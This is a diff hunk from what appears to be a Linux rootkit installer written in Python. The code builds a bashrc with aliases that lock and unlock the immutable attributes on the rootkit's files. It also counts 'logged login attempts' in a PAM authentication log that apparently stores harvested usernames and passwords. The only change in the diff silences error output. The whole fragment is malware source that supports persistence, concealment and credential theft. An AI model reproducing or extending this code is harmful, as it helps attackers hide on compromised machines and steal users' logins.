@@ -379,7 +379,7 @@ alias pacman=apt-get
 alias unchattr='cd {0}; chattr -ia .* * &>/dev/null; echo "chattr permissions removed on rootkit files"'
 alias rechattr='cd {0}; chattr +ia .* * &>/dev/null; echo "rootkit files chattr permissions reinstated"'
 
-echo -e "\\033[1mLogged login attempts: \\033[1;32m$(grep Username ~/pam_auth_logs | wc -l)\\033[0m"
+echo -e "\\033[1mLogged login attempts: \\033[1;32m$(grep Username ~/pam_auth_logs 2>/dev/null | wc -l)\\033[0m"
 """
     fd = open("bashrc", "w")
     fd.write(bash_rc.format(INSTALL))
